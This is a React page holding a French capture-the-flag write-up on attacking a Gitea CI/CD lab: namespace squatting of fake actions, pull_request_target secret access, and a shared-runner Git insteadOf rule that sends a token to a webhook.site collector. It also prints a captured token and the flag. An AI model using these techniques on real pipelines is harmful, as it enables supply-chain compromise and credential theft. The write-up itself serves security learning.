import { Terminal, GitBranch, Workflow, Key, ShieldAlert } from "lucide-react";
import { RevealFlagBlock } from "@/components/RevealFlag";
import { PageHeader } from "@/components/PageHeader";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p
          className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}
        >
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "PipeHop | Writeup | 0xbbuddha",
  description:
    "Comment j'ai enchaîné Gitea ouvert, un faux namespace actions et un runner partagé pour atteindre le dépôt privé (PipeHop, Hack'In 2K26).",
};

export default function WriteupPipeHopPage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <PageHeader
        eyebrow="Writeup"
        title="PipeHop"
        description="Sur cette instance Gitea, tout le monde peut s'inscrire. Un squat du namespace actions, un workflow en pull_request_target, et un runner partagé qui garde la mémoire entre les jobs suffisent à enchaîner jusqu'au dépôt caché."
        breadcrumbs={[
          { label: "README", href: "/" },
          { label: "Writeups", href: "/writeups" },
          { label: "PipeHop" },
        ]}
        stats={[
          { label: "Platform", value: "Hack'In 2K26" },
          { label: "Focus", value: "CI/CD abuse" },
          { label: "Date", value: "2026-04-11" },
        ]}
      />

      <article className="mt-8 space-y-10">
        <p className="text-sm text-muted-foreground">
          URL du lab (indicatif, l&apos;instance peut être éteinte) :{" "}
          <span className="font-mono">http://34.155.191.36:32783</span>
        </p>

        <section>
          <h2 className="mb-4 font-mono text-xl font-semibold">Énoncé</h2>
          <blockquote className="border-l-2 border-primary/40 pl-4 text-muted-foreground italic">
            DevForge Inc. just open-sourced their flagship project on their self-hosted Git platform.
            Their CI/CD pipeline is fully automated and state of the art, or so they claim.
            Sometimes the walls between public and private aren&apos;t as solid as they seem.
          </blockquote>
          <p className="mt-3 text-sm text-muted-foreground">
            Traduction libre : tout est automatisé, sauf la frontière public / privé, qui finit par
            couler un peu partout.
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <GitBranch className="size-5 text-primary" />
            Reconnaissance
          </h2>
          <p className="text-muted-foreground">
            En farfouillant les dépôts publics, deux noms reviennent tout de suite :{" "}
            <strong>opendev/webapp</strong> et <strong>opendev/ci-actions</strong>. Dans{" "}
            <strong>ci-actions</strong>, un workflow tourne en{" "}
            <code className="text-sm">pull_request_target</code>, récupère le secret{" "}
            <code className="text-sm">CROSS_ORG_TOKEN</code>, et clone à la fois{" "}
            <strong>opendev/webapp</strong> et <strong>secureops/infrastructure</strong>. Ce dernier
            est privé : c&apos;est clairement là que le challenge veut qu&apos;on aille.
          </p>
          <CodeBlock title="Extrait : opendev/ci-actions">
{`name: Sync Dependents

on:
  pull_request_target:
    types: [opened, synchronize]
  push:
    branches: [main]

jobs:
  sync:
    runs-on: ubuntu-latest

    steps:
      - name: Trigger dependent builds
        env:
          DISPATCH_TOKEN: \${{ secrets.CROSS_ORG_TOKEN }}
        run: |
          REPOS=(
            "opendev/webapp"
            "secureops/infrastructure"
          )

          for repo in "\${REPOS[@]}"; do
            git clone "http://ci-bot:\${DISPATCH_TOKEN}@localhost/\${repo}.git" "\$WORKDIR"
            # ...
          done`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            Résolution locale des actions
          </h2>
          <p className="text-muted-foreground">
            Les logs des runs publics m&apos;ont fait tiquer : le runner ne va pas chercher GitHub,
            il résout <code className="text-sm">actions/checkout@v4</code> et{" "}
            <code className="text-sm">actions/setup-node@v4</code> en local, vers{" "}
            <code className="text-sm">http://localhost/actions/...</code>. Tant que l&apos;inscription
            est ouverte, rien n&apos;empêche de créer un utilisateur / org <strong>actions</strong> et
            de publier ses propres dépôts <strong>checkout</strong> et <strong>setup-node</strong>.
          </p>
          <CodeBlock title="Logs runner (extrait)" result>
{`git clone 'http://localhost/actions/checkout' # ref=v4
Unable to clone http://localhost/actions/checkout refs/heads/v4: repository not found`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Workflow className="size-5 text-primary" />
            Chaîne d&apos;exploitation
          </h2>
          <p className="mb-3 text-muted-foreground">
            Voici comment j&apos;ai enchaîné, en gros. Ce n&apos;est pas linéaire sur le moment, mais
            une fois le schéma en tête ça tient debout.
          </p>
          <ol className="list-inside list-decimal space-y-2 text-muted-foreground">
            <li>
              Je crée le compte <strong>actions</strong> et les dépôts{" "}
              <strong>actions/checkout</strong> et <strong>actions/setup-node</strong> avec une branche{" "}
              <code className="text-sm">v4</code> (le faux <strong>setup-node</strong> peut rester
              minimal).
            </li>
            <li>
              Le faux <strong>checkout</strong> fait le vrai travail : cloner avec le token injecté,
              exfiltrer ce qui m&apos;intéresse, et surtout laisser une config Git globale sur le
              runner pour l&apos;étape suivante.
            </li>
            <li>
              Plutôt que de me battre avec les PR fork sur <strong>webapp</strong> (approbation
              manuelle), je fork <strong>opendev/ci-actions</strong> et j&apos;ouvre une PR :{" "}
              <code className="text-sm">pull_request_target</code> s&apos;exécute avec les secrets du
              dépôt cible, pas avec ceux de mon fork.
            </li>
            <li>
              Le job <strong>sync-dependents</strong> pousse sur <strong>webapp</strong> et{" "}
              <strong>infrastructure</strong>, ce qui déclenche les workflows <strong>push</strong> de{" "}
              <strong>webapp</strong>… qui passent par mes faux <strong>actions/*</strong>.
            </li>
          </ol>
          <CodeBlock title="Variables d&apos;environnement exfiltrées (exemple)" result>
{`GITHUB_REPOSITORY=opendev/webapp
GITHUB_ACTOR=devforge-admin
INPUT_TOKEN=b5d8f9acc3fdf3ebd7f12b33e2030ee0f92939d2`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            Pivot : Git insteadOf sur runner partagé
          </h2>
          <p className="text-muted-foreground">
            Le token récupéré côté <strong>webapp</strong> ne m&apos;ouvre pas directement{" "}
            <strong>secureops/infrastructure</strong>. Le vrai pivot, c&apos;est le runner partagé :
            la config Git globale posée pendant un run public survit aux jobs suivants. J&apos;ajoute
            une règle du type{" "}
            <code className="text-sm">url.&quot;https://…&quot;.insteadOf &quot;http://ci-bot:&quot;</code>
            : au prochain <code className="text-sm">git clone</code> du job{" "}
            <strong>sync-dependents</strong>, Git réécrit l&apos;URL vers mon collecteur HTTP, et le
            token <code className="text-sm">CROSS_ORG_TOKEN</code> se retrouve en clair dans la
            requête.
          </p>
          <CodeBlock title="Règle Git globale (schéma)">
{`git config --global url."https://webhook.site/<TOKEN>/".insteadOf "http://ci-bot:"`}
          </CodeBlock>
          <CodeBlock title="Requête observée sur le collecteur (schéma)" result>
{`https://webhook.site/<collector>/<CROSS_ORG_TOKEN>@localhost/secureops/infrastructure.git/HEAD`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Une fois le bon token en poche, je clone <strong>secureops/infrastructure</strong> et je
            vais lire <code className="text-sm">config/production.env</code>. Le flag est au bout du
            fichier (voir le bloc masqué plus bas).
          </p>
          <CodeBlock title="Clone (schéma)">
{`git clone "http://x-access-token:<TOKEN>@34.155.191.36:32783/secureops/infrastructure.git"`}
          </CodeBlock>
          <CodeBlock title="Fichiers utiles dans le dépôt" result>
{`config/production.env
config/staging.env
config/development.env
scripts/deploy.sh
.gitea/workflows/deploy.yml`}
          </CodeBlock>
          <CodeBlock title="config/production.env (sans la valeur du flag)">
{`# Deployment verification token
FLAG=(voir bloc de dévoilement ci-dessous)`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <ShieldAlert className="size-5 text-primary" />
            Flag
          </h2>
          <RevealFlagBlock title="Flag" result>
{`HNx05{544ba5cbeb1128207e8c94eb30ae287b}`}
          </RevealFlagBlock>
        </section>

        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Ce que j&apos;en retiens</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li>
              Un namespace <strong>actions</strong> libre + résolution locale, ça transforme des
              workflows banals en exécution de code de n&apos;importe qui.
            </li>
            <li>
              <code className="text-sm">pull_request_target</code> depuis un fork sur{" "}
              <strong>ci-actions</strong>, c&apos;est le déclencheur qui voit les bons secrets.
            </li>
            <li>
              Les faux <strong>checkout</strong> / <strong>setup-node</strong> donnent la main sur
              l&apos;environnement du job public.
            </li>
            <li>
              Runner partagé qui persiste : une fois une règle Git globale posée, le prochain pipeline
              privé peut me livrer <strong>CROSS_ORG_TOKEN</strong> sur un plateau.
            </li>
            <li>
              Fin de parcours : dépôt <strong>secureops/infrastructure</strong>,{" "}
              <strong>production.env</strong>, flag.
            </li>
          </ul>
        </section>
      </article>
    </div>
  );
}
